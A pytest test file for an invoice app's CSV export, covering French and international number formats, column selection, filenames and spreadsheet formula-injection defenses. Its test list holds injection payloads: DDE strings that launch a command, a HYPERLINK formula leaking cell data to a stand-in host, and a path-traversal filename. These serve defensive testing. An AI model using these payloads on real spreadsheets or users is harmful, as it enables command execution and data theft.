from __future__ import annotations

import csv
import io
import time
from datetime import UTC, datetime, timedelta

import pytest

from src.models.schemas import ExtractedInvoice, InvoiceLineItem
from src.services import export
from src.services.repository import StoredInvoice

CREATED = datetime(2026, 9, 21, 12, 0, tzinfo=UTC)

# Payloads a hostile invoice could carry in any text field
FORMULAS = [
    "=1+1",
    "+1+1",
    "-1+1",
    "@SUM(A1:A9)",
    "=cmd|' /C calc'!A0",
    "-2+3+cmd|' /C calc'!A0",
    "\t=1+1",
    "\r=1+1",
    "   =1+1",
    "\n@evil",
    '=HYPERLINK("http://evil.example/?d="&A1,"click")',
]


def _stored(invoice: ExtractedInvoice | None = None, *, name: str = "facture.pdf") -> StoredInvoice:
    invoice = invoice or ExtractedInvoice(
        invoice_number="F-2026-001",
        date="2026-09-10",
        supplier="Orange SA",
        client="Dupont SARL",
        lines=[
            InvoiceLineItem(description="Forfait", quantity=2, unit_price=50.0, total=100.0),
            InvoiceLineItem(description="Option", quantity=1, unit_price=0.125, total=0.13),
        ],
        subtotal_ht=100.13,
        tva_rate=0.2,
        total_ttc=120.16,
    )
    return StoredInvoice(
        id="3f9a1c2e-7b4d-4e8a-9c31-5d2f0a6b8e14",
        created_at=CREATED,
        expires_at=CREATED + timedelta(days=30),
        invoice=invoice,
        display_name=name,
        pdf_hash="a" * 64,
    )


def _parse(data: bytes, delimiter: str = ";") -> list[list[str]]:
    assert data.startswith("﻿".encode())  # BOM: Excel reads UTF-8
    return list(csv.reader(io.StringIO(data.decode("utf-8-sig")), delimiter=delimiter))


# --- content and format ------------------------------------------------------------------
def test_default_export_has_the_wireframe_columns_in_french_format() -> None:
    rows = _parse(export.invoices_csv([_stored()]))
    assert rows[0] == [
        "Date",
        "N° facture",
        "Fournisseur",
        "Montant HT",
        "Montant TVA",
        "Montant TTC",
    ]
    assert rows[1] == ["2026-09-10", "F-2026-001", "Orange SA", "100,13", "20,03", "120,16"]


def test_international_locale_uses_comma_separator_and_decimal_point() -> None:
    rows = _parse(export.invoices_csv([_stored()], locale="intl"), delimiter=",")
    assert rows[1][3:] == ["100.13", "20.03", "120.16"]


def test_chosen_columns_and_their_order_are_respected() -> None:
    rows = _parse(export.invoices_csv([_stored()], columns=["supplier", "status", "tva_rate"]))
    assert rows[0] == ["Fournisseur", "Fiabilité", "Taux TVA (%)"]
    assert rows[1] == ["Orange SA", "élevée", "20,00"]


def test_low_reliability_and_warnings_are_exported() -> None:
    invoice = ExtractedInvoice(extraction_confidence="low", warnings=["Line 1: mismatch", "x"])
    rows = _parse(export.invoices_csv([_stored(invoice)], columns=["status", "warnings"]))
    assert rows[1] == ["faible", "Line 1: mismatch | x"]


def test_missing_values_give_empty_cells() -> None:
    rows = _parse(export.invoices_csv([_stored(ExtractedInvoice())]))
    assert rows[1] == [""] * 6


def test_tva_rate_given_as_a_percentage_is_not_multiplied_again() -> None:
    invoice = ExtractedInvoice(tva_rate=20)
    assert _parse(export.invoices_csv([_stored(invoice)], columns=["tva_rate"]))[1] == ["20,00"]


def test_negative_amounts_of_credit_notes_stay_numeric_and_are_not_prefixed() -> None:
    invoice = ExtractedInvoice(subtotal_ht=-100.0, total_ttc=-120.0)
    rows = _parse(export.invoices_csv([_stored(invoice)], columns=["subtotal_ht", "total_ttc"]))
    assert rows[1] == ["-100,00", "-120,00"]


def test_empty_selection_gives_only_the_header() -> None:
    assert len(_parse(export.invoices_csv([]))) == 1


def test_one_row_per_invoice_line_with_the_invoice_reference_repeated() -> None:
    rows = _parse(export.lines_csv([_stored(), _stored(ExtractedInvoice(supplier="EDF"))]))
    assert rows[0][3:] == ["Désignation", "Quantité", "Prix unitaire HT", "Total HT"]
    assert rows[1] == ["F-2026-001", "2026-09-10", "Orange SA", "Forfait", "2", "50,00", "100,00"]
    assert rows[2][3:] == ["Option", "1", "0,125", "0,13"]  # a fine unit price keeps its decimals
    assert len(rows) == 3  # the invoice without lines adds none


@pytest.mark.parametrize("bad", [[], ["nope"], ["supplier", "__class__"]])
def test_unknown_or_empty_columns_are_refused(bad: list[str]) -> None:
    with pytest.raises(ValueError):
        export.invoices_csv([_stored()], columns=bad)


def test_unknown_locale_is_refused() -> None:
    with pytest.raises(ValueError, match="locale"):
        export.invoices_csv([_stored()], locale="de")  # type: ignore[arg-type]


# --- formula injection ------------------------------------------------------------------------
@pytest.mark.parametrize("payload", FORMULAS)
def test_neutralize_prefixes_every_formula_trigger(payload: str) -> None:
    assert export.neutralize(payload) == "'" + payload


@pytest.mark.parametrize(
    "harmless", ["Orange", "A-1", "N°-1", "x=1", "a+b", "20 % de remise", "", "é=mc2"]
)
def test_neutralize_leaves_ordinary_text_alone(harmless: str) -> None:
    assert export.neutralize(harmless) == harmless


@pytest.mark.parametrize("payload", FORMULAS)
def test_no_text_column_of_any_export_can_carry_a_formula(payload: str) -> None:
    """Every field an attacker controls, in both files: nothing may start like a formula."""
    # Built with model_construct: a value that is even nastier than what the schema lets through.
    invoice = ExtractedInvoice.model_construct(
        invoice_number=payload,
        date=payload,
        supplier=payload,
        client=payload,
        warnings=[payload],
        lines=[InvoiceLineItem(description=payload, quantity=1, unit_price=1.0, total=1.0)],
    )
    stored = _stored(invoice, name=payload)
    text_columns = ["date", "invoice_number", "supplier", "client", "warnings", "file"]
    exports = [
        export.invoices_csv([stored], columns=text_columns),
        export.lines_csv([stored]),
    ]
    for data in exports:
        for row in _parse(data)[1:]:
            for cell in row:
                if cell and not cell[0].isdigit():
                    assert cell.startswith("'") and not cell.lstrip("'")[:0], cell
                assert not cell.lstrip(" \t\r\n").startswith(("=", "+", "-", "@"))
                assert not cell.startswith(("\t", "\r"))


def test_field_content_cannot_break_the_csv_structure() -> None:
    nasty = 'a;b,c"d\r\ne;f'
    invoice = ExtractedInvoice.model_construct(supplier=nasty, warnings=[], lines=[])
    rows = _parse(export.invoices_csv([_stored(invoice)], columns=["supplier", "total_ttc"]))
    assert len(rows) == 2 and len(rows[1]) == 2 and rows[1][0] == nasty


# --- filename ------------------------------------------------------------------------------------
def test_filename_is_built_from_dates_only() -> None:
    early = _stored(ExtractedInvoice(date="2026-08-01"))
    late = _stored(ExtractedInvoice(date="2026-09-18"), name="../../evil.pdf")
    assert export.suggested_filename([late, early]) == "invoices_2026-08-01_to_2026-09-18.csv"
    assert export.suggested_filename([early], "lines") == "lines_2026-08-01_to_2026-08-01.csv"
    assert export.suggested_filename([]) == "invoices.csv"


def test_large_export_stays_fast() -> None:
    line = InvoiceLineItem(description="x", quantity=1, unit_price=1.0, total=1.0)
    invoices = [_stored(ExtractedInvoice(supplier=f"F{i}", lines=[line] * 200)) for i in range(500)]
    started = time.monotonic()
    assert len(_parse(export.lines_csv(invoices))) == 100_001
    assert time.monotonic() - started < 5
